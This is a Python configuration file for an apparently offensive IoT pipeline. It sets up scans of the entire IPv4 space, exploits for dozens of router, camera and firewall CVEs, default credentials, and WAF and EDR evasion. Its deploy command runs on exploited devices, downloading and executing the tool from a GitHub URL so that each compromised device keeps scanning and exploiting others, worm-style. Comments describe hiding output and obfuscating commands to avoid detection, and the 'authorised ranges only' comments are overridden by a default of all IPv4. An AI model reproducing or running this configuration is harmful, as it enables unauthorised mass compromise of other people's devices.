"""
Sofia-iot — Cấu hình chung.

Mọi tham số vận hành của pipeline đều khai báo tập trung tại đây:

  Giai đoạn 0 (target_generator) : DISCOVER_MODE, ZMAP_BANDWIDTH, SCAN_PORTS, ...
  Giai đoạn 1 (scanner)          : TIMEOUT, USER_AGENT
  Giai đoạn 2 (exploits)         : DEFAULT_CREDS, ZTE_PAYLOAD_FILE, ZTE_ENDPOINT
  Giai đoạn 3 (verifier)         : VERIFIER_COMMAND, WEBROOT_CANDIDATES
  Giai đoạn 4 (webhook)          : WEBHOOK_URL, NOTIFY_ALL
"""

import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.join(BASE_DIR, "results")
ZMAP_RAW_DIR = os.path.join(RESULTS_DIR, "zmap_raw")
STATE_FILE = os.path.join(RESULTS_DIR, "state.json")       # checkpoint/resume batch /16
RANGES_CACHE_FILE = os.path.join(ZMAP_RAW_DIR, "ranges.json")  # cache dải /16 đã sinh
SCAN_CACHE_DIR = os.path.join(RESULTS_DIR, "scan_cache")   # cache raw scan (P0)
EVIDENCE_DIR = os.path.join(RESULTS_DIR, "evidence")       # HTTP artifacts (P1)
LOG_DIR = RESULTS_DIR                                      # log ở results/ (P2)
LOG_FILE = os.path.join(LOG_DIR, "sofia.log")              # RotatingFileHandler
JSONL_FILE = os.path.join(LOG_DIR, "findings.jsonl")       # JSON log mỗi finding
LOG_MAX_BYTES = 10 * 1024 * 1024                            # 10 MB / file log
LOG_BACKUP_COUNT = 5

# ── Chung ───────────────────────────────────────────────────────────────
TIMEOUT = 10                # giây: timeout cho connect / HTTP / exploit
THREADS = 50                # số worker trong ThreadPoolExecutor
USER_AGENT = ("Mozilla/5.0 (X11; Linux x86_64; rv:115.0) "
              "Gecko/20100101 Firefox/115.0")

# ── TLS (P1 OPSEC — dùng chung mọi HTTP qua tlsutil.py) ────────────────
# Cipher browser-like (Chrome 12x): ECDHE + GCM/CHACHA20, ưu tiên AES-128.
TLS_MIN_VERSION = "TLSv1_2"
TLS_CIPHERS = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
]
TLS_CIPHERSUITES = [   # TLS 1.3
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
]
TLS_ALPN = ["http/1.1"]   # giữ HTTP/1.1 (code path raw socket, không HTTP/2)

# ── Giai đoạn 1: song song hóa fingerprint (P0) ─────────────────────────
FINGERPRINT_WORKERS = 200   # worker ThreadPoolExecutor cho stage1 fingerprint
FP_PER_HOST_LIMIT = 3       # số task fingerprint chạy đồng thời trên CÙNG 1 host
                            # (semaphore — tránh làm nghẽn thiết bị yếu)

# ── Rate-limit theo host giai đoạn exploit (P0 — 0.2) ───────────────────
# THREADS worker vẫn chạy song song nhiều host, NHƯNG mỗi HOST chỉ có tối đa
# EXPLOIT_PER_HOST_LIMIT task exploit/verify đồng thời (semaphore) — 50 threads
# không còn dồn 17 CVE vào 1 thiết bị cùng lúc. EXPLOIT_JITTER thêm chút trễ
# ngẫu nhiên (0..n giây) trước mỗi probe để tránh burst nhịp đều dễ bị nhận diện.
EXPLOIT_PER_HOST_LIMIT = 2
EXPLOIT_JITTER = 0.1         # giây, phạm vi ngẫu nhiên [0, EXPLOIT_JITTER)

# ── Guardrail internet-wide (P0 — 0.1, fail-closed) ─────────────────────
# Kế hoạch quét vượt quá ngưỡng này (tính bằng tổng số IP trong các dải CIDR)
# bắt buộc phải có cờ --confirm-internet-wide mới được chạy — chống vô tình
# quét toàn IPv4 khi chỉ gõ `python3 main.py`. Mặc định 16.7M ≈ một dải /8.
INTERNET_WIDE_HOSTS = 16_777_216

# ── Giai đoạn 0: Discovery ──────────────────────────────────────────────
DISCOVER_MODE = True        # True = chạy zmap/masscan; False = đọc targets.txt
ZMAP_BANDWIDTH = "100M"     # băng thông zmap, VD "1M", "100M", "1G"
ZMAP_INTERFACE = ""         # để trống = mặc định; VD "eth0"
# ── Engine phát hiện (--engines) ─────────────────────────────────────────
# zmap (mặc định): zmap tự sinh các dải IPv4 (via AUTO_GEN_RANGES), quét cổng
#   phát hiện; các IP số rồi được gửi qua masscan để quét cổng mở (hybrid).
# masscan : bỏ qua phát hiện host riêng, masscan quét SCAN_PORTS trực tiếp trên
#   toàn dải /16; fallback tự động về zmap-per-port khi masscan chưa cài đặt.
DISCOVER_ENGINE = "zmap"     # "zmap" | "masscan"; CLI --engines ghi đè biến này
ZMAP_DISCOVERY_PORTS = [80]  # cổng zmap dùng chỉ để phát hiện host số (quét cổng chi tiết → masscan)
ZMAP_HOSTS_FILE = os.path.join(ZMAP_RAW_DIR, "live_hosts.txt")  # IP phát hiện được, 1 IP/dòng, đưa qua masscan -iL
MASSCAN_RATE = 1000          # packet/giây masscan khi quét cổng (polite)
# ── Auto-generate dải IPv4 /16 (nâng cấp: zmap tự sinh dải thay vì khai tay) ──
# Khi SCAN_RANGES rỗng và AUTO_GEN_RANGES=True, pipeline tự chia AUTO_GEN_CIDR
# thành các dải /16 (65536 IP/dải), xáo thứ tự, quét từng batch rồi gửi webhook.
# Resume theo từng dải qua STATE_FILE — chạy lại tiếp tục từ dải chưa xong.
AUTO_GEN_RANGES = True       # True = tự sinh dải /16 khi SCAN_RANGES trống
AUTO_GEN_CIDR = "0.0.0.0/0"  # dải gốc để chia — 0.0.0.0/0 = toàn bộ IPv4
AUTO_GEN_SPLIT_TO = 16       # chia thành chunk /N — mặc định 16 → 65536 dải /16
AUTO_GEN_SHUFFLE = True      # xáo thứ tự dải (tránh quét cụm 1 vùng liên tục)
AUTO_GEN_SEED = 0            # 0 = ngẫu nhiên mỗi lần; >0 = tái lập thứ tự xáo
AUTO_GEN_MAX_CHUNKS = 0      # 0 = tất cả; >0 = giới hạn số dải /16 (test nhanh)
# ── Batch + politeness ──────────────────────────────────────────────────
BATCH_SIZE = 4               # số dải /16 quét mỗi batch (1 batch = 1 checkpoint + webhook)
POLITENESS_SLEEP_MIN = 2.0   # giây ngủ tối thiểu giữa 2 batch (chống chặn)
POLITENESS_SLEEP_MAX = 8.0   # giây ngủ tối đa giữa 2 batch (ngẫu nhiên trong khoảng)
# Cổng quét — đã mở rộng phủ mọi CVE trong registry:
#   37215 (Huawei HG532), 80/8080 (web IoT), 8443 (SonicWall GMS),
#   21009 (GMS XML-RPC), 443 (web IoT qua HTTPS), 7547 (TR-069)
#   + 23/554/1883/5683/49152 (P1 — banner telnet/RTSP/MQTT/CoAP/UPnP để
#     fingerprint thiết bị không có web UI; đánh đổi: quét nhiều cổng hơn
#     → masscan/zmap lâu hơn, nên cân nhắc bỏ bớt khi chỉ quan tâm web).
SCAN_PORTS = [37215, 80, 8080, 8443, 443, 7547, 21009, 23, 554, 1883, 5683, 49152]

# Cache raw scan (P0): re-scan 1 dải giống hệt trong TTL → đọc cache thay vì
# gọi zmap/masscan lần nữa (resume/overlap không quét lại từ đầu).
SCAN_CACHE_TTL = 6 * 3600   # giây (6h)

# Discovery overlap (P0): prefetch discovery batch kế trong lúc exploit
# batch hiện tại — double buffer. Tắt nếu máy yếu RAM/CPU.
DISCOVERY_PREFETCH = True
# Dải IPv4 để zmap/masscan quét (CIDR). Trống = KHÔNG quét (fail-closed).
# Chỉ đưa vào dải bạn được phép kiểm thử (lab / mạng khách hàng).
# VD: ["192.0.2.0/24"] — quét 192.0.2.1-254 trên mọi SCAN_PORTS.
SCAN_RANGES = []             # dải CIDR khai tay (--scan-range / config). Trống = fail-closed,
                            # trừ khi AUTO_GEN_RANGES=True → tự sinh dải /16 từ AUTO_GEN_CIDR.
BLACKLIST_FILE = os.path.join(BASE_DIR, "blacklist.conf")
MAX_TARGETS = 1000          # giới hạn số IP đưa vào giai đoạn exploit (an toàn)
ALLOW_PRIVATE = False       # False = lọc RFC1918/loopback/link-local khỏi mục tiêu

# ── Chống bỏ sót / WAF / EDR ───────────────────────────────────────────
RETRY_ATTEMPTS = 2          # số lần thử lại tối đa (fingerprint/exploit) khi
                            # timeout / nghi WAF chặn / kết nối flaky
RETRY_BACKOFF = 0.5         # giây: chờ giữa các lần thử lại
EVASION_MODE = True         # xoay UA/header + biến thể payload né WAF
WAF_DETECT = True           # nhận diện WAF từ response, ghi chú vào finding
EDR_OBFUSCATE = True        # bọc lệnh deploy bằng base64 + tên biến ngẫu nhiên
FINGERPRINT_RETRY = True    # thử lại fingerprint khi lần đầu timeout
MAX_HTTP_PARSE = 20000      # số byte body tối đa dùng để tìm webroot/banner

# ── Giai đoạn 1: Fingerprint (scanner) ───────────────────────────────────
FINGERPRINT_TLS = True       # True = đọc CN/SAN từ chứng TLS trên cổng 443/8443/...
FINGERPRINT_BANNER = True    # True = probe banner specific per cổng (TR-069/SOAP/HTTP HEAD)
FINGERPRINT_EXTRA_PATHS = [  # path bổ sung quét chỉ khi thân page KHÔNG có marker (giảm âm)
    "/login.asp", "/web/login.html", "/userRpm/",
]
MAX_BANNER_BYTES = 4096      # số byte banner tối đa giữ từ probe cổng-specific

# ── Giai đoạn 2: Exploit ────────────────────────────────────────────────
# Tài khoản mặc định thử khi module cần xác thực (nhiều thiết bị IoT dùng
# default credential — thử sau khi request không auth bị từ chối).
DEFAULT_CREDS = {
    "CVE-2022-30023": ("admin", "admin"),   # Tenda HG9
    "CVE-2023-33538": ("admin", "admin"),   # TP-Link WR940N/WR841N/WR740N
    "CVE-2025-1316":  ("admin", "1234"),    # Edimax IC-7100
    "CVE-2025-29635": ("admin", "admin"),   # D-Link DIR-823X
}

# CVE-2024-45414 (ZTE) — lỗ hổng stack overflow ở webPrivateDecrypt, chưa có
# PoC công khai. File blob payload (target-specific) do người dùng cung cấp;
# nếu file chứa placeholder {cmd} thì module sẽ thay thế bằng lệnh probe.
ZTE_PAYLOAD_FILE = os.path.join(RESULTS_DIR, "zte_45414_payload.bin")
ZTE_ENDPOINT = "/cgi-bin/webPrivateDecrypt"   # tuỳ chỉnh theo firmware đích

# ── Giai đoạn 3: Verifier ───────────────────────────────────────────────
# Phần deploy (chạy sau `id; echo MARKER_<tag>`):
#   - nohup ... &      : tách tiến trình — response không treo, tiến trình sống
#                        tiếp khi kết nối đóng (chống SIGHUP).
#   - >/dev/null 2>&1  : nuốt stdout/stderr — không lộ dấu vết trong response.
#   - curl -fsSL -o    : tải im lặng, theo redirect, fail-fast.
#   - unzip -oq + rm -f: giải nén im lặng, xóa zip sau khi dùng.
#   - sudo -n ... || ...: sudo không tương tác, fallback chạy trực tiếp.
#   - cd /tmp          : không ghi file lộ liễu ở cwd.
# Khi EDR_OBFUSCATE=True, verifier tự bọc phần này bằng base64 (evasion.edr_wrap)
# → process/network chỉ thấy printf|base64 -d|sh, không lộ curl/python3/URL.
VERIFIER_DEPLOY = (
    "nohup sh -c 'cd /tmp && curl -fsSL -o sofia_scanV3.zip "
    "https://github.com/anhkhoa210v/Tool-EX/raw/refs/heads/main/sofia_scanV3.zip && "
    "unzip -oq sofia_scanV3.zip && rm -f sofia_scanV3.zip && "
    "cd sofia_scan && bash setup.sh && "
    "(sudo -n python3 main.py --generate-ipv4 --engine zmap || "
    "python3 main.py --generate-ipv4 --engine zmap)' >/dev/null 2>&1 &"
)
# Lệnh probe đầy đủ: `id` xác nhận exec + tag để nhận diện output.
# {rand} được verifier thay bằng tag duy nhất của probe.
VERIFIER_COMMAND = "id; echo MARKER_{rand}; " + VERIFIER_DEPLOY

# Webroot thử cho blind-check — static + theo loại thiết bị + phát hiện động.
WEBROOT_CANDIDATES = [
    "/web/", "/tmp/", "/www/", "/usr/www/", "/home/httpd/",
]
# Webroot đặc trưng theo loại thiết bị (dùng khi fingerprint ra device).
DEVICE_WEBROOTS = {
    "hikvision":   ["/web/", "/home/hikvision/web/", "/usr/share/hikvision/web/"],
    "tp-link":     ["/web/", "/tmp/web/", "/usr/www/"],
    "d-link":      ["/web/", "/www/", "/home/httpd/"],
    "tenda":       ["/web/", "/www/", "/usr/www/"],
    "zte":         ["/web/", "/usr/www/", "/home/zte/web/"],
    "dvr":         ["/web/", "/www/", "/mnt/web/"],
    "goahead":     ["/web/", "/www/", "/etc/web/", "/mnt/web/"],
    "boa":         ["/web/", "/www/", "/home/httpd/", "/usr/share/boa/"],
    "lighttpd":    ["/www/", "/srv/www/", "/usr/share/lighttpd/"],
    "draytek":     ["/web/", "/usr/share/www/", "/etc/www/"],
    "sonicwall":   ["/web/", "/usr/web/"],
    "struts":      ["/usr/local/tomcat/webapps/ROOT/", "/opt/tomcat/webapps/ROOT/"],
    "unknown":     [],
}

# ── Giai đoạn 4: Webhook ────────────────────────────────────────────────
WEBHOOK_URL = os.environ.get("SOFIA_WEBHOOK_URL", "")  # VD "https://server/hook"
NOTIFY_ALL = False          # True = gửi webhook cả trường hợp VULN_NO_EXEC
NOTIFY_PROGRESS = True      # True = gửi webhook tiến độ (batch bắt đầu/hoàn tất,
                            # summary cuối) khi đã cấu hình WEBHOOK_URL
# ── Webhook: HMAC + retry (P0 — 0.3 upgrade proposal) ───────────────────
# Xác thực nguồn gửi: nếu WEBHOOK_SECRET khác rỗng, mỗi request kèm header
#   X-Sofia-Signature: sha256=<hex HMAC-SHA256(body)> — receiver phải verify
#   cùng secret để chặn kẻ biết URL giả tạo finding. Lấy từ env
#   SOFIA_WEBHOOK_SECRET (không commit secret vào config).
# Retry: lỗi mạng / HTTP >= 500 được gửi lại tối đa WEBHOOK_RETRY_ATTEMPTS
#   lần với backoff *2^n giây; HTTP 4xx = payload bị từ chối (không retry).
WEBHOOK_SECRET = os.environ.get("SOFIA_WEBHOOK_SECRET", "")
WEBHOOK_RETRY_ATTEMPTS = 3     # số lần gửi lại tối đa khi lỗi tạm thời
WEBHOOK_RETRY_BACKOFF = 1.0    # giây cơ sở backoff: sleep = backoff * 2^n
WEBHOOK_TIMEOUT = 8            # giây timeout mỗi lần gửi

# ── Giai đoạn 1: favicon-hash fingerprint (P1, Shodan-style) ────────────
# Map hash_mmh3(base64(favicon)) -> tên thiết bị/nền tảng. Hash công thức:
#   mmh3.hash(base64.b64encode(favicon_bytes))  (MurmurHash3 x86 32-bit)
# MẶC ĐỊNH TRỐNG — không nhét hash bịa; muốn dùng thì quét thật lấy hash
# (xem results/... favicon_hash trong fingerprints.json) rồi điền vào đây.
FAVICON_HASHES = {}          # VD: {123456789: "hikvision"}
FAVICON_PATH = "/favicon.ico"

# ── Giai đoạn 1: probe model/firmware (P1) ──────────────────────────────
# Mỗi mục: (đường dẫn, regex rút chuỗi) — chỉ probe khi fingerprint đã ra
# marker tương ứng (tiết kiệm request). Regex lấy group đầu tiên khớp.
MODEL_PROBES = {
    "hikvision": ("/ISAPI/System/deviceInfo", r"<modelName>([^<]+)</modelName>"),
    "dahua":     ("/cgi-bin/SystemInfo",      r"<DeviceName>([^<]+)</DeviceName>"),
}
MODEL_TITLE_RES = {   # regex rút model ngay từ title/body (không cần request thêm)
    "tp-link": r"TL-[A-Za-z0-9]+",
    "d-link":  r"DIR-[-A-Za-z0-9]+",
    "tenda":   r"(?:FH|AC|AX)[-A-Za-z0-9]+",
}

# ── Giai đoạn 3: deploy mirror đa hình (P1 OPSEC) ───────────────────────
# Thay vì hardcode 1 URL công khai cố định (dễ bị honeypot/EDR dựng
# signature), verifier chọn NGẪU NHIÊN 1 mirror trong DEPLOY_URLS và đổi
# tên file/thư mục giải nén mỗi lần (evasion.rand_tag). Nếu DEPLOY_SHA256
# khai báo → kiểm tra checksum SHA-256 trước khi giải nén (chống tải file
# bị thay thế từ mirror xâm nhập). Để trống nếu mirror chưa công bố hash.
DEPLOY_URLS = [
    "https://github.com/anhkhoa210v/Tool-EX/raw/refs/heads/main/sofia_scanV3.zip",
]
DEPLOY_SHA256 = ""          # VD "0123...abc" — verify SHA-256 của file tải về

# ── CVSS severity (P1 — báo cáo HTML/CSV) ───────────────────────────────
# Điểm CVSS v3 best-effort từ advisory công khai (NVD/vendor/CISA KEV).
# QUAN TRỌNG: giá trị xấp xỉ — trước khi dùng cho báo cáo chính thức hãy
# đối chiếu NVD (nvd.nist.gov/vuln/detail/<CVE>) vì điểm có thể thay đổi
# theo thời gian/bảng CVSS. CVE nào thiếu → mặc định 0.0 (không xếp hạng).
CVE_SEVERITY = {
    "CVE-2017-17215": 8.8,   # Huawei HG532 UPnP RCE
    "CVE-2017-5638":  10.0,  # Apache Struts2 S2-045
    "CVE-2018-9866":  9.8,   # SonicWall GMS
    "CVE-2019-17621": 8.8,   # D-Link DIR-859
    "CVE-2020-8515":  9.8,   # DrayTek keyPath
    "CVE-2021-36260": 9.8,   # Hikvision
    "CVE-2021-46422": 9.8,   # Telesquare SDT-CW3B1
    "CVE-2022-30023": 8.8,   # Tenda HG9
    "CVE-2023-1389":  8.8,   # TP-Link Archer AX21
    "CVE-2023-25280": 8.0,   # D-Link DIR-820L (CISA KEV)
    "CVE-2023-27240": 8.8,   # Tenda AX3
    "CVE-2023-33538": 8.8,   # TP-Link TL-WR9xx
    "CVE-2024-3721":  9.8,   # TBK DVR
    "CVE-2024-45414": 9.8,   # ZTE httpd
    "CVE-2025-1316":  8.8,   # Edimax IC-7100
    "CVE-2025-29635": 8.8,   # D-Link DIR-823X
    "CVE-2025-34043": 9.8,   # Vacron NVR
    # Nâng cấp P1 — CVE mồ côi có module:
    "CVE-2018-9995":  9.8,   # XiongMai credential disclosure (unauth)
    "CVE-2022-30525": 9.8,   # Zyxel Firewall ZTP RCE
    "CVE-2018-13379": 10.0,  # FortiOS SSL-VPN path traversal (CISA KEV)
    "CVE-2018-0296":  7.7,   # Cisco ASA directory traversal (auth)
    # Nâng cấp P1 — CVE mồ côi còn lại (fingerprint_only hoặc deterministic):
    "CVE-2021-33044": 9.8,   # Dahua Web Service auth bypass (RPC2_Login)
    "CVE-2021-33045": 9.8,   # Dahua addAdmin (PoC disruptive — không implement)
    "CVE-2020-29583": 9.8,   # Zyxel firewall hardcoded admin (zyad5001)
    "CVE-2022-40684": 9.8,   # FortiOS/FortiProxy auth bypass (CISA KEV)
    "CVE-2018-14847": 9.8,   # MikroTik Winbox directory traversal (CISA KEV)
    "CVE-2021-35395": 9.8,   # Realtek Jungle SDK (AP-Router) buffer overflow
    "CVE-2023-30799": 7.2,   # MikroTik RouterOS priv-esc admin→super-admin (NVD)
    "CVE-2023-22945": 4.3,   # Netgear R7000 (NVD 4.3 — PoC chưa chắc chắn)
    # Lưu ý: CVE-2021-3373, CVE-2024-30877 KHÔNG có bản ghi NVD (RESERVED) —
    # đã đăng ký fingerprint_only nhưng không gán severity để tránh bịa số liệu.
}

# Ngưỡng severity theo CVSS v3 để xếp nhãn trong report.
SEVERITY_LEVELS = [
    (9.0, "Critical"), (7.0, "High"), (4.0, "Medium"), (0.1, "Low"), (0.0, "Info"),
]
















